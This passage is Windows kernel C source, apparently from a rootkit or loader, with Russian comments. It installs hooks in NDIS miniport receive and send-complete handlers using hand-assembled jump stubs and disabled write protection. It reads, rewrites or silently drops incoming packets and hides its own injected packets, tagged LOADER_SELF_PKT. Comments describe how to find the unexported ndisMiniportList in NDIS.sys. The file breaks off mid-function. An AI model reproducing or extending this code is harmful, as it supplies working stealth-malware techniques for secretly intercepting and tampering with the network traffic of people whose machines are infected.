//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

typedef VOID (*FnEthFilterDprIndicateReceive)(IN NDIS_HANDLE BindingContext, IN NDIS_HANDLE MacReceiveContext, IN PCHAR Address, IN pvoid_t HeaderBuffer, IN UINT HeaderBufferSize, IN pvoid_t LookaheadBuffer, IN UINT LookaheadBufferSize, IN UINT PacketSize);
typedef VOID (*FnMIndicateReceivePacket)(IN NDIS_HANDLE MiniportAdapterHandle, IN PPNDIS_PACKET ReceivedPackets, IN UINT NumberOfPackets);

typedef VOID (*FnIndicateNetBufferListsHandler)(pvoid_t MiniportBlock, IN PNET_BUFFER_LIST NetBufferLists, IN NDIS_PORT_NUMBER PortNumber, IN ulong_t NumberOfNetBufferLists, IN ulong_t ReceiveFlags);
typedef BOOLEAN (*FnHooKNdis6_MiniportIsr)(IN NDIS_HANDLE MiniportInterruptContext, OUT PBOOLEAN QueueMiniportInterruptDpcHandler, OUT ulong_t* TargetProcessors);

#pragma warning(push)
#pragma warning(disable:4127)
void ndisQueryPacket(IN PNDIS_PACKET _Packet, OUT PUINT _PhysicalBufferCount OPTIONAL, OUT PUINT _BufferCount OPTIONAL, OUT PNDIS_BUFFER* _FirstBuffer OPTIONAL, OUT PUINT _TotalPacketLength OPTIONAL)
{
    if ((_FirstBuffer) != NULL)
    {
        PNDIS_BUFFER * __FirstBuffer = (_FirstBuffer);
        *(__FirstBuffer) = (_Packet)->Private.Head;
    }
    if ((_TotalPacketLength) || (_BufferCount) || (_PhysicalBufferCount))
    {
        if (!(_Packet)->Private.ValidCounts)
        {
            PNDIS_BUFFER TmpBuffer = (_Packet)->Private.Head;
            UINT PTotalLength = 0, PPhysicalCount = 0, PAddedCount = 0;
            UINT PacketLength, Offset;

            while (TmpBuffer != (PNDIS_BUFFER)NULL)
            {
                NdisQueryBufferOffset(TmpBuffer, &Offset, &PacketLength);
                PTotalLength += PacketLength;
                PPhysicalCount += (UINT)NDIS_BUFFER_TO_SPAN_PAGES(TmpBuffer);
                ++PAddedCount;
                TmpBuffer = TmpBuffer->Next;
            }
            (_Packet)->Private.Count = PAddedCount;
            (_Packet)->Private.TotalLength = PTotalLength;
            (_Packet)->Private.PhysicalCount = PPhysicalCount;
            (_Packet)->Private.ValidCounts = TRUE;
        }

        if (_PhysicalBufferCount)
        {
            PUINT __PhysicalBufferCount = (_PhysicalBufferCount);
            *(__PhysicalBufferCount) = (_Packet)->Private.PhysicalCount;
        }
        if (_BufferCount)
        {
            PUINT __BufferCount = (_BufferCount);
            *(__BufferCount) = (_Packet)->Private.Count;
        }
        if (_TotalPacketLength)
        {
            PUINT __TotalPacketLength = (_TotalPacketLength);
            *(__TotalPacketLength) = (_Packet)->Private.TotalLength;
        }
    }
}
#pragma warning(pop)

void network_on_halt(pndis_adapter_t pAdapter)
{
    USE_GLOBAL_BLOCK
    if (pGlobalBlock->pNetworkBlock->needReconfigure == TRUE) {
        pGlobalBlock->pCommonBlock->fnKeSetEvent(&pAdapter->dynDetectEvent, 0, FALSE);
    }
    else {
        pGlobalBlock->pNetworkBlock->needReconfigure = TRUE;
    }
}

#ifdef _WIN64
VOID HookNdis5_EthRxIndicateHandler(PHOOK_CONTEXT pHookContext, IN NDIS_HANDLE BindingContext, IN NDIS_HANDLE MacReceiveContext, IN PCHAR Address, IN pvoid_t HeaderBuffer, IN UINT HeaderBufferSize, IN pvoid_t LookaheadBuffer, IN UINT LookaheadBufferSize, IN UINT PacketSize)
#else
VOID HookNdis5_EthRxIndicateHandler(PHOOK_CONTEXT pHookContext, IN NDIS_HANDLE BindingContext, IN NDIS_HANDLE MacReceiveContext, IN PCHAR Address, IN pvoid_t HeaderBuffer, IN UINT HeaderBufferSize, IN pvoid_t LookaheadBuffer, IN UINT LookaheadBufferSize, IN UINT PacketSize)
#endif // _WIN64
{
    pndis_adapter_t pAdapter;
    int result = HOOK_PASS_PACKET;
    USE_GLOBAL_BLOCK

    if (pHookContext != NULL && pHookContext->pAdapter != NULL) {
        pAdapter = pHookContext->pAdapter;

        __movsb(pGlobalBlock->pNetworkBlock->pInPacketBuffer, (uint8_t*)HeaderBuffer, HeaderBufferSize);
        __movsb(pGlobalBlock->pNetworkBlock->pInPacketBuffer + HeaderBufferSize, LookaheadBuffer, PacketSize);

        result = pGlobalBlock->pNetworkBlock->fnHookInternalReceiveHandler(pGlobalBlock->pNetworkBlock->pInPacketBuffer, HeaderBufferSize + PacketSize);

        if (result & HOOK_UPDATE_PACKET) {
            __movsb((uint8_t*)HeaderBuffer, pGlobalBlock->pNetworkBlock->pInPacketBuffer, HeaderBufferSize);
            __movsb(LookaheadBuffer, pGlobalBlock->pNetworkBlock->pInPacketBuffer + HeaderBufferSize, PacketSize);
        }
    }

    if (result & HOOK_PASS_PACKET) {
        ((FnEthFilterDprIndicateReceive)pHookContext->pOrigFunc)(BindingContext, MacReceiveContext, Address, HeaderBuffer, HeaderBufferSize, LookaheadBuffer, LookaheadBufferSize, PacketSize);
    }
}

#ifdef _WIN64
VOID HookNdis5_PacketIndicateHandler(IN NDIS_HANDLE MiniportAdapterHandle, IN PPNDIS_PACKET ReceivePackets, IN UINT NumberOfPackets, PHOOK_CONTEXT pHookContext)
#else
VOID HookNdis5_PacketIndicateHandler(PHOOK_CONTEXT pHookContext, IN NDIS_HANDLE MiniportAdapterHandle, IN PPNDIS_PACKET ReceivePackets, IN UINT NumberOfPackets)
#endif // _WIN64
{
    pndis_adapter_t pAdapter;
    int result = HOOK_PASS_PACKET;
    PNDIS_BUFFER pNdisBuffer;
    int i, lastValid;
    USE_GLOBAL_BLOCK

    if (pHookContext) {
        pAdapter = pHookContext->pAdapter;
        do {
            uint8_t* data;
            uint8_t* virAddr;
            UINT len = 0;
            UINT count = 0;

            for (i = 0, lastValid = 0; i < (int)NumberOfPackets; ++i) {
                pGlobalBlock->pNetworkBlock->fnndisQueryPacket((PNDIS_PACKET)ReceivePackets[i], NULL, NULL, &pNdisBuffer, NULL);
                data = pGlobalBlock->pNetworkBlock->pInPacketBuffer;

                while (pNdisBuffer != NULL) {
                    ndisQueryBufferSafe(pNdisBuffer, &virAddr, &len, HighPagePriority);
                    if (virAddr == NULL || len == 0) {
                        break;
                    }

                    __movsb(data, virAddr, len);
                    data += len;
                    count += len;
                    ndisGetNextBuffer(pNdisBuffer, &pNdisBuffer);
                }

                result = pGlobalBlock->pNetworkBlock->fnHookInternalReceiveHandler(pGlobalBlock->pNetworkBlock->pInPacketBuffer, count);

                if (result & HOOK_UPDATE_PACKET) {
                    pGlobalBlock->pNetworkBlock->fnndisQueryPacket((PNDIS_PACKET)ReceivePackets[i], NULL, NULL, &pNdisBuffer, NULL);
                    data = pGlobalBlock->pNetworkBlock->pInPacketBuffer;

                    while (pNdisBuffer != NULL) {
                        ndisQueryBufferSafe(pNdisBuffer, &virAddr, &len, HighPagePriority);
                        if (virAddr == NULL || len == 0) {
                            break;
                        }

                        __movsb(virAddr, data, len);
                        data += len;
                        ndisGetNextBuffer(pNdisBuffer, &pNdisBuffer);
                    }
                }

                if (result & HOOK_REJECT_PACKET) {
                    NDIS_SET_PACKET_STATUS(ReceivePackets[i], NDIS_STATUS_SUCCESS);
                    pGlobalBlock->pNetworkBlock->fnMiniportReturnPacket(pAdapter->pMiniAdapterCtx, ReceivePackets[i]);
                    if (i - 1 >= lastValid) {
                        ((FnMIndicateReceivePacket)pHookContext->pOrigFunc)(MiniportAdapterHandle, &ReceivePackets[lastValid], i - lastValid);
                    }
                    lastValid = i + 1;
                }
            }
        } while (0);
    }

    if (lastValid < i) {
        ((FnMIndicateReceivePacket)pHookContext->pOrigFunc)(MiniportAdapterHandle, &ReceivePackets[lastValid], i - lastValid);
    }
}


#define NET_BUFFER_CURRENT_MDL_OFFSET(_NB)          ((_NB)->CurrentMdlOffset)
#define NET_BUFFER_CURRENT_MDL(_NB)                 ((_NB)->CurrentMdl)

#ifdef _WIN64
VOID HookNdis6_ReceiveHandler(IN OUT NDIS_HANDLE MiniportBlock, IN PNET_BUFFER_LIST pNetBufferLists, IN NDIS_PORT_NUMBER PortNumber, IN ulong_t NumberOfNetBufferLists, IN pvoid_t pDummy, IN PHOOK_CONTEXT pHookContext, IN ulong_t ReceiveFlags)
#else
VOID HookNdis6_ReceiveHandler(IN PHOOK_CONTEXT pHookContext, pvoid_t MiniportBlock, IN PNET_BUFFER_LIST pNetBufferLists, IN NDIS_PORT_NUMBER PortNumber, IN ulong_t NumberOfNetBufferLists, IN ulong_t ReceiveFlags)
#endif // _WIN64
{
    PNET_BUFFER_LIST pHeadNetBufferList = pNetBufferLists;
    PNET_BUFFER_LIST pCurrNetBufferList;
    PNET_BUFFER_LIST pNextNetBufferList;
    PNET_BUFFER_LIST pPrevNetBufferList = NULL;
    PNET_BUFFER pNetBuffer = NULL;
    uint8_t* data;
    uint8_t* dataPart;
    PMDL mdl = NULL;
    ulong_t mdlOffset;
    ulong_t packetSize = 0;
    ulong_t bufferSize;
    int result = HOOK_PASS_PACKET;
    pndis_adapter_t pAdapter = pHookContext->pAdapter;
    ulong_t ReturnFlags;
    ulong_t nblCount = NumberOfNetBufferLists;
    USE_GLOBAL_BLOCK

    // Список списка пакетов...
    for (pCurrNetBufferList = pNetBufferLists; pCurrNetBufferList != NULL; pCurrNetBufferList = pNextNetBufferList) {
        pNextNetBufferList = pCurrNetBufferList->Next;

        pNetBuffer = NET_BUFFER_LIST_FIRST_NB(pCurrNetBufferList);
        packetSize = NET_BUFFER_DATA_LENGTH(pNetBuffer);
        mdlOffset = NET_BUFFER_CURRENT_MDL_OFFSET(pNetBuffer);
        mdl = NET_BUFFER_CURRENT_MDL(pNetBuffer);
        data = pGlobalBlock->pNetworkBlock->pInPacketBuffer;

        bufferSize = MmGetMdlByteCount(mdl);
        dataPart = (uint8_t*)mmGetSystemAddressForMdlSafe(mdl, NormalPagePriority);

        dataPart += mdlOffset;
        bufferSize -= mdlOffset;

        do {
            if (packetSize > bufferSize) {
                break;
            }

            __movsb(data, dataPart, packetSize);

            result = pGlobalBlock->pNetworkBlock->fnHookInternalReceiveHandler(data, packetSize);

            if (result & HOOK_PASS_PACKET) {
                if (result & HOOK_UPDATE_PACKET) {
                    __movsb(dataPart, data, packetSize);
                }
                break;
            }

            if (NDIS_TEST_RECEIVE_CAN_PEND(ReceiveFlags)) {
                ReturnFlags = 0;
                if (NDIS_TEST_RECEIVE_AT_DISPATCH_LEVEL(ReceiveFlags)) {
                    NDIS_SET_RETURN_FLAG(ReturnFlags, NDIS_RETURN_FLAGS_DISPATCH_LEVEL);
                }
                pCurrNetBufferList->Next = NULL;
                pGlobalBlock->pNetworkBlock->fnNdisReturnNetBufferLists(pAdapter->pSendHandle, pCurrNetBufferList, ReturnFlags);
            }

            if (pPrevNetBufferList == NULL) {
                pHeadNetBufferList = pNextNetBufferList;
            }
            else {
                pPrevNetBufferList->Next = pNextNetBufferList;
            }

            --nblCount;
        } while (0);

        if (result & HOOK_PASS_PACKET) {
            pPrevNetBufferList = pCurrNetBufferList;
        }
    }

    if (nblCount > 0) {
        ((FnIndicateNetBufferListsHandler)pHookContext->pOrigFunc)(MiniportBlock, pHeadNetBufferList, PortNumber, nblCount, ReceiveFlags);
    }
}

#ifdef _WIN64
VOID HookNdis5_HaltHandler(NDIS_HANDLE MiniportAdapterContext, PHOOK_CONTEXT pHookContext)
#else
VOID HookNdis5_HaltHandler(PHOOK_CONTEXT pHookContext, NDIS_HANDLE MiniportAdapterContext)
#endif // _WIN64
{
    USE_GLOBAL_BLOCK

    pGlobalBlock->pNetworkBlock->fnnetwork_on_halt(pHookContext->pAdapter);

    ((FnNdis5HaltHandler)pHookContext->pOrigFunc)(MiniportAdapterContext);
}

#ifdef _WIN64
VOID HookNdis6_HaltHandler(NDIS_HANDLE MiniportAdapterContext, NDIS_HALT_ACTION HaltAction, PHOOK_CONTEXT pHookContext)
#else
VOID HookNdis6_HaltHandler(PHOOK_CONTEXT pHookContext, NDIS_HANDLE MiniportAdapterContext, NDIS_HALT_ACTION HaltAction)
#endif // _WIN64
{
    USE_GLOBAL_BLOCK

    pGlobalBlock->pNetworkBlock->fnnetwork_on_halt(pHookContext->pAdapter);

    ((FnNdis6HaltHandler)pHookContext->pOrigFunc)(MiniportAdapterContext, HaltAction);
}

#ifdef _WIN64
NDIS_STATUS HookNdis6_PauseHandler(__in NDIS_HANDLE MiniportAdapterContext, __in PNDIS_MINIPORT_PAUSE_PARAMETERS MiniportPauseParameters, PHOOK_CONTEXT pHookContext)
#else
NDIS_STATUS HookNdis6_PauseHandler(PHOOK_CONTEXT pHookContext, __in NDIS_HANDLE MiniportAdapterContext, __in PNDIS_MINIPORT_PAUSE_PARAMETERS MiniportPauseParameters)
#endif // _WIN64
{
    USE_GLOBAL_BLOCK

    pHookContext->pAdapter->miniportPaused = TRUE;

    return ((FnNdis6PauseHandler)pHookContext->pOrigFunc)(MiniportAdapterContext, MiniportPauseParameters);
}

#ifdef _WIN64
NDIS_STATUS HookNdis6_RestartHandler(__in NDIS_HANDLE MiniportAdapterContext, __in PNDIS_MINIPORT_RESTART_PARAMETERS MiniportRestartParameters, PHOOK_CONTEXT pHookContext)
#else
NDIS_STATUS HookNdis6_RestartHandler(PHOOK_CONTEXT pHookContext, __in NDIS_HANDLE MiniportAdapterContext, __in PNDIS_MINIPORT_RESTART_PARAMETERS MiniportRestartParameters)
#endif // _WIN64
{
    USE_GLOBAL_BLOCK

    pHookContext->pAdapter->miniportPaused = FALSE;

    return ((FnNdis6RestartHandler)pHookContext->pOrigFunc)(MiniportAdapterContext, MiniportRestartParameters);
}

VOID HookNdis5_OpenSendCompleteHandler(IN NDIS_HANDLE BindingContext, IN PNDIS_PACKET Packet, IN NDIS_STATUS Status)
{
    pndis_adapter_t pAdapter;
    PSEND_RSVD pSendRsvd;
    PNDIS_BUFFER pNdisBuffer = NULL;
    pvoid_t pVA = NULL;
    UINT dataLength = 0;
    USE_GLOBAL_BLOCK

    pAdapter = pGlobalBlock->pNetworkBlock->pActiveAdapter;

    pSendRsvd = (PSEND_RSVD)(Packet->ProtocolReserved);

    if (pSendRsvd->tag == LOADER_SELF_PKT) {
        pGlobalBlock->pNetworkBlock->fnNdisUnchainBufferAtFront(Packet, &pNdisBuffer);
        ndisQueryBuffer(pNdisBuffer, &pVA, &dataLength);
        ndisFreeBuffer(pNdisBuffer);
        pGlobalBlock->pNetworkBlock->fnNdisFreeMemory(pVA, 0, 0);
        pGlobalBlock->pNetworkBlock->fnNdisFreePacket(Packet);
        if (pAdapter->zombiBlockXP.References > 0) {
            --pAdapter->zombiBlockXP.References;
        }
        return;// NDIS_STATUS_SUCCESS;
    }

    ((SEND_COMPLETE_HANDLER)pAdapter->OriginalSendCompleteHandler)(BindingContext, Packet, Status);
}

#ifdef _WIN64
VOID HookNdis5_SendCompleteHandler(IN NDIS_HANDLE BindingContext, IN PNDIS_PACKET Packet, IN NDIS_STATUS Status, IN PHOOK_CONTEXT pHookContext)
#else
VOID HookNdis5_SendCompleteHandler(IN PHOOK_CONTEXT pHookContext, IN NDIS_HANDLE BindingContext, IN PNDIS_PACKET Packet, IN NDIS_STATUS Status)
#endif // _WIN64
{
    PSEND_RSVD pSendRsvd;
    PNDIS_BUFFER pNdisBuffer = NULL;
    pvoid_t pVA = NULL;
    UINT dataLength = 0;
    USE_GLOBAL_BLOCK

    if (pHookContext != NULL) {
        pSendRsvd = (PSEND_RSVD)(Packet->ProtocolReserved);
        if (pSendRsvd->tag == LOADER_SELF_PKT) {
            pGlobalBlock->pNetworkBlock->fnNdisUnchainBufferAtFront(Packet, &pNdisBuffer);
            ndisQueryBuffer(pNdisBuffer, &pVA, &dataLength);
            ndisFreeBuffer(pNdisBuffer);
            pGlobalBlock->pNetworkBlock->fnNdisFreeMemory(pVA, 0, 0);
            pGlobalBlock->pNetworkBlock->fnNdisFreePacket(Packet);
            if (pHookContext->pAdapter->zombiBlockXP.References > 0) {
                --pHookContext->pAdapter->zombiBlockXP.References;
            }
            return;
        }
    }

    ((SEND_COMPLETE_HANDLER)pHookContext->pOrigFunc)(BindingContext, Packet, Status);
}

#ifdef _WIN64
VOID HookNdis6_MSendNetBufferListsComplete(pvoid_t SendNBLsCompleteContext, PNET_BUFFER_LIST pNetBufferLists, ulong_t SendCompleteFlags, PHOOK_CONTEXT pHookContext)
#else
VOID HookNdis6_MSendNetBufferListsComplete(PHOOK_CONTEXT pHookContext, pvoid_t SendNBLsCompleteContext, PNET_BUFFER_LIST pNetBufferLists, ulong_t SendCompleteFlags)
#endif // _WIN64
{
    PNET_BUFFER_LIST pHeadNetBufferList = pNetBufferLists;
    PNET_BUFFER_LIST pCurrNetBufferList;
    PNET_BUFFER_LIST pNextNetBufferList;
    PNET_BUFFER_LIST pPrevNetBufferList = NULL;
    PSEND_RSVD pSendRsvd;
    ulong_t BufferLength;
    uint8_t* pCopyData = NULL;
    PMDL pMdl = NULL;
    USE_GLOBAL_BLOCK

    if (pHookContext != NULL) {
        for (pCurrNetBufferList = pNetBufferLists; pCurrNetBufferList != NULL; pCurrNetBufferList = pNextNetBufferList) {
            pNextNetBufferList = pCurrNetBufferList->Next;

            do {
                if (pCurrNetBufferList->Context == NULL) {
                    break;
                }

                if (NET_BUFFER_LIST_CONTEXT_DATA_SIZE(pCurrNetBufferList) == 0) {
                    break;
                }

                pSendRsvd = (PSEND_RSVD)NET_BUFFER_LIST_CONTEXT_DATA_START(pCurrNetBufferList);

                if (pSendRsvd->tag != LOADER_SELF_PKT || pCurrNetBufferList->SourceHandle != pHookContext->pAdapter->SourceHandle) {
                    break;
                }

                pMdl = NET_BUFFER_FIRST_MDL(NET_BUFFER_LIST_FIRST_NB(pCurrNetBufferList));
                ndisQueryMdl(pMdl, (pvoid_t*)&pCopyData, &BufferLength, NormalPagePriority);
                pGlobalBlock->pNetworkBlock->fnNdisFreeNetBufferList(pCurrNetBufferList);
                pGlobalBlock->pNetworkBlock->fnNdisFreeMdl(pMdl);
                pGlobalBlock->pNetworkBlock->fnNdisFreeMemory(pCopyData, 0, 0);

                if (pPrevNetBufferList == NULL) {
                    pHeadNetBufferList = pNextNetBufferList;
                }
                else {
                    pPrevNetBufferList->Next = pNextNetBufferList;
                }
                pCurrNetBufferList = NULL;
            } while (FALSE);

            if (pCurrNetBufferList != NULL) {
                pPrevNetBufferList = pCurrNetBufferList;
            }
        }
    }

    if (pHeadNetBufferList != NULL) {
        ((FnNdisMSendNetBufferListsComplete)pHookContext->pOrigFunc)(SendNBLsCompleteContext, pHeadNetBufferList, SendCompleteFlags);
    }
}

PHOOK_CONTEXT HookNdisFunc(pvoid_t pHookFunc, pvoid_t* ppOrigFunc, pndis_adapter_t pAdapter, int numberOfArgs)
{
#ifdef _WIN64
    UINT64 absAddr;
#endif
    PHOOK_CONTEXT pHookContext;
    //    pvoid_t origFunc;
    pmod_common_block_t pCommonBlock;
    pvoid_t pOrigFunc;
    USE_GLOBAL_BLOCK

    pCommonBlock = pGlobalBlock->pCommonBlock;

    if (!pGlobalBlock->pCommonBlock->fnMmIsAddressValid(ppOrigFunc)) {
        return NULL;
    }

    pOrigFunc = *ppOrigFunc;
    if (pOrigFunc == NULL) {
        return NULL;
    }
    

    // Проверяем установлен ли наш хук, если да, то выходим из функции
    for (pHookContext = pAdapter->pHookContext; pHookContext != NULL; pHookContext = pHookContext->pNext) {
        if (pHookContext == pOrigFunc)
            return NULL;
    }

    // В случае, если наш хук не установлен, то проверяем создавался ли он ранее...
    for (pHookContext = pAdapter->pHookContext; pHookContext != NULL; pHookContext = pHookContext->pNext) {
        if (pHookContext->pHookFunc == pHookFunc)
            break;
    }

    if (pHookContext == NULL) { // Если не создавался, то создаём...
        pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pHookContext, sizeof(HOOK_CONTEXT), NonPagedPool);

#ifdef _WIN64
        absAddr = (UINT64)pHookFunc;

        if (numberOfArgs < 4) {
            //  RCX,    RDX,    R8,     R9
            // {0x0000, 0xBA48, 0xB849, 0xB949};
            pHookContext->hookCode.less4.code1_movRXXh = (numberOfArgs == 1 ? 0xBA48 : (numberOfArgs == 2 ? 0xB849 : (numberOfArgs == 3 ? 0xB949 : 0x0000)));
            pHookContext->hookCode.less4.pHookContext = pHookContext;
            pHookContext->hookCode.less4.code2_0x68 = 0x68;
            pHookContext->hookCode.less4.lJumpAddr = (uint32_t)(absAddr & 0xFFFFFFFF);;
            pHookContext->hookCode.less4.code3_0xC7442404 = 0x042444C7;
            pHookContext->hookCode.less4.hJumpAddr = (uint32_t)((absAddr >> 32) & 0xFFFFFFFF);
            pHookContext->hookCode.less4.code4_C3 = 0xC3;
        }
        else {
            pHookContext->hookCode.above4.code1_48B8h = 0xB848;
            pHookContext->hookCode.above4.pHookContext = pHookContext;
            pHookContext->hookCode.above4.code21_48894424h = 0x24448948;
            pHookContext->hookCode.above4.code22_20h = 0x20;
            pHookContext->hookCode.above4.code3_58h = 0x58;
            pHookContext->hookCode.above4.code4_4883EC10h = 0x10EC8348;
            pHookContext->hookCode.above4.code51_48894424h = 0x24448948;
            pHookContext->hookCode.above4.code52_0x20 = 0x20;
            pHookContext->hookCode.above4.code6_0x68 = 0x68;
            pHookContext->hookCode.above4.lOurRetAddr = (uint32_t)(((UINT64)&pHookContext->hookCode.above4.codeB_4883C410h) & 0xFFFFFFFF);
            pHookContext->hookCode.above4.code7_0xC7442404 = 0x042444C7;
            pHookContext->hookCode.above4.hOurRetAddr = (uint32_t)((((UINT64)&pHookContext->hookCode.above4.codeB_4883C410h) >> 32) & 0xFFFFFFFF);
            pHookContext->hookCode.above4.code8_0x68 = 0x68;
            pHookContext->hookCode.above4.lJumpAddr = (uint32_t)(absAddr & 0xFFFFFFFF);;
            pHookContext->hookCode.above4.code9_0xC7442404 = 0x042444C7;
            pHookContext->hookCode.above4.hJumpAddr = (uint32_t)((absAddr >> 32) & 0xFFFFFFFF);
            pHookContext->hookCode.above4.codeA_C3 = 0xC3;
            pHookContext->hookCode.above4.codeB_4883C410h = 0x10C48348;
            pHookContext->hookCode.above4.codeC_FF642410h = 0x102464FF;
        }

#else

        pHookContext->code1_0x58 = 0x58;
        pHookContext->code2_0x68 = 0x68;
        pHookContext->code3_0x50 = 0x50;
        pHookContext->code4_0xE9 = 0xE9;
        pHookContext->pHookContext = pHookContext;
        pHookContext->pHookProcOffset = ((ulong_t)pHookFunc) - (((ulong_t)&pHookContext->pHookProcOffset) + sizeof(ulong_t));

#endif

        pHookContext->pAdapter    = pAdapter;
        pHookContext->pHookFunc = pHookFunc;

        pHookContext->pNext = pAdapter->pHookContext;
        pAdapter->pHookContext = pHookContext;
    }

    // Устанавливаем наш хук заново
    pHookContext->pOrigFunc = pOrigFunc;
    pHookContext->ppOriginFunc = ppOrigFunc;

    pGlobalBlock->pCommonBlock->fncommon_disable_wp();
#ifdef _WIN64
    InterlockedExchange64((LONGLONG*)ppOrigFunc, (LONGLONG)pHookContext);
#else
    InterlockedExchange((LONG*)ppOrigFunc, (LONG)pHookContext);
#endif

    pGlobalBlock->pCommonBlock->fncommon_enable_wp();

    return pHookContext;
}

void network_unhook_ndis(pndis_adapter_t pAdapter)
{
    PHOOK_CONTEXT pHookItr, pHookTmp;
    KIRQL oldIrql;
    USE_GLOBAL_BLOCK

    pHookItr = pAdapter->pHookContext;

    while (pHookItr != NULL) {
        if (*(pvoid_t*)(pHookItr->ppOriginFunc) == (pvoid_t)pHookItr) {
            oldIrql = pGlobalBlock->pCommonBlock->fnKfRaiseIrql(2);
            pGlobalBlock->pCommonBlock->fncommon_disable_wp();
#ifdef _WIN64
            InterlockedExchange64((LONGLONG*)pHookItr->ppOriginFunc, (LONGLONG)pHookItr->pOrigFunc);
#else
            InterlockedExchange((LONG*)pHookItr->ppOriginFunc, (LONG)pHookItr->pOrigFunc);
#endif        
            pGlobalBlock->pCommonBlock->fncommon_enable_wp();
            pGlobalBlock->pCommonBlock->fnKfLowerIrql(oldIrql);
        }

        pHookTmp = pHookItr;
        pHookItr = pHookItr->pNext;

        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pHookTmp, LOADER_TAG);
    }

    pAdapter->pHookContext = NULL;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

pndis_adapter_t network_destroy_adapter(pndis_adapter_t pAdapter)
{
    pndis_adapter_t pNext = pAdapter->pNext;
    USE_GLOBAL_BLOCK

    if (pAdapter->ndisMajorVersion == 5) {
        if (pAdapter->bufferPoolHandle != NULL) {
            pGlobalBlock->pNetworkBlock->fnNdisFreeBufferPool(pAdapter->bufferPoolHandle);
        }

        if (pAdapter->packetPoolHandle != NULL) {
            pGlobalBlock->pNetworkBlock->fnNdisFreePacketPool(pAdapter->packetPoolHandle);
        }
    }
    else {
        pGlobalBlock->pNetworkBlock->fnNdisFreeNetBufferListPool(pAdapter->nbPoolHandle);
    }

    pGlobalBlock->pNetworkBlock->fnnetwork_unhook_ndis(pAdapter);

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pAdapter, LOADER_TAG);

    return pNext;
}

void network_destroy_all_adapters()
{
    pndis_adapter_t pAdapter;
    USE_GLOBAL_BLOCK

    if (pGlobalBlock->pNetworkBlock->pHeadAdapter != NULL) {
        pAdapter = pGlobalBlock->pNetworkBlock->pHeadAdapter;
        while (pAdapter != NULL) {
            pAdapter = pGlobalBlock->pNetworkBlock->fnnetwork_destroy_adapter(pAdapter);
        }

        pGlobalBlock->pNetworkBlock->pActiveAdapter = pGlobalBlock->pNetworkBlock->pHeadAdapter = NULL;
    }
}

// Здесь находятся функции для конфигурации сети
// Поиск структры _NDIS_MINIPORT_BLOCK
// Глобальная переменная _ndisMiniportList содержит адрес минипорта _NDIS_MINIPORT_BLOCK. К ней обращаются из:
// - ndis!ndisIsMiniportStarted
// - ndis!ndisFindMiniportOnGlobalList
// - ndis!ndisAddDevice
/*
  Упрощённое описание алгоритма поиска неэкспортируемой переменной _ndisMiniportList:
  1. Ищем базу NDIS.sys
  2. Вычисляем адрес секции .data
  3. Вычисляем начальный и конечный адреса неподкачиваемой памяти
  3. Инициализируем цикл перебора переменных с шагом итерации 4 байта для x32 и 8 байт для x64
  4. Получаем очередную переменную, считываем её содержимое и проверяем принадлежность адресному пространству ядра,
     а точнее проверяем принадлежность диапазону неподкачиваемой памяти

*/

// void NetCfgStaticAdapterAddressDetector(PADAPTER pAdapter)
// {
//     UINT BytesProcessed;
//     NDIS_REQUEST ndisRequest;
//     NDIS_STATUS ndisStatus;
//     DEFINE_GLOBAL_DATA(pGlobalBlock);
//     IMPL_GLOBAL_DATA(pGlobalBlock);
// 
//     if (LDRINFO_IS_XP_LIKE_OS) {
//         ndisRequest.RequestType = NdisRequestQueryInformation;
// 
//         ndisRequest.DATA.QUERY_INFORMATION.Oid = OID_802_3_CURRENT_ADDRESS;
//         ndisRequest.DATA.QUERY_INFORMATION.InformationBuffer = &pAdapter->macAddr[0];
//         ndisRequest.DATA.QUERY_INFORMATION.InformationBufferLength = 6;
// 
//         pGlobalBlock->fnNdisRequest(&ndisStatus, pAdapter->pOpenBlock, &ndisRequest);
// 
//         if (ndisStatus == NDIS_STATUS_PENDING)
//             return;
// 
//         pAdapter->bObtainedMac = TRUE;
//     }
// }

NTSTATUS convertStringIpToUINT32(wchar_t* stringIp, uint32_t* uVal)
{
    NTSTATUS ntStatus;
    UNICODE_STRING uStr;
    ulong_t tVal;
    wchar_t* ptr = stringIp;
    wchar_t* zeroPtr;
    ulong_t lShift = 0;
    USE_GLOBAL_BLOCK

    *uVal = 0;
    for ( ; *ptr != 0; ++ptr) {
        zeroPtr = ptr;
        while (*zeroPtr != L'.' && *zeroPtr != 0) zeroPtr++;
        *zeroPtr = 0;
        pGlobalBlock->pCommonBlock->fnRtlInitUnicodeString(&uStr, ptr);
        ntStatus = pGlobalBlock->pCommonBlock->fnRtlUnicodeStringToInteger(&uStr, 10, &tVal);

        if (lShift < 24)
            *zeroPtr = '.';
        if (ntStatus != STATUS_SUCCESS)
            return ntStatus;

        *uVal |= (tVal  & 0xFF) << lShift;

        if (lShift == 24)
            break;

        lShift += 8;
        ptr = zeroPtr;
    }
    return ntStatus;
}

#define NUMBER_OF_PARAMS 3

#if DBG
const char* TmpIptable[NUMBER_OF_PARAMS] = {"IP", "Gateway", "Mask"};
#endif

void RegistryFindAdapterInfo(PUNICODE_STRING pMiniportName, pndis_adapter_t* ppAdapter)
{
    HANDLE regHandle;
    NTSTATUS ntStatus;
    ulong_t ssLen = /*sizeof(ifNodeName) + */255*sizeof(wchar_t);
    uint8_t* ptr1;
    wchar_t* regNode;
    wchar_t* devPtr = NULL;
    NDIS_STRING interfacesKey;
    //     const NDIS_STRING* netParams[NUMBER_OF_PARAMS] = {&netParam1, &netParam2, &netParam3};
    //     const NDIS_STRING* altNetParams[NUMBER_OF_PARAMS] = {&altNetParam1, &altNetParam2, &altNetParam3};
    uint32_t netAdaptParams[NUMBER_OF_PARAMS] = {0, 0, 0};
    uint32_t netNameServers[2] = {0, 0};
    //     NDIS_STRING nameServer = NDIS_STRING_CONST("NameServer");
    //     NDIS_STRING altNameServer = NDIS_STRING_CONST("DhcpNameServer");
    wchar_t tmpRegValue[128];
    wchar_t* ptr = tmpRegValue;
    wchar_t* zeroPtr;
    UNICODE_STRING uStr;
    int counter = 0;
    USE_GLOBAL_BLOCK

    if (pMiniportName == NULL) {
        return;
    }

    devPtr = pMiniportName->Buffer;
    while (*devPtr != 0 && *devPtr != L'{') {
        devPtr++;
    }

    if (*devPtr == 0) {
        return;
    }

    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &regNode, ssLen + 2, NonPagedPool);
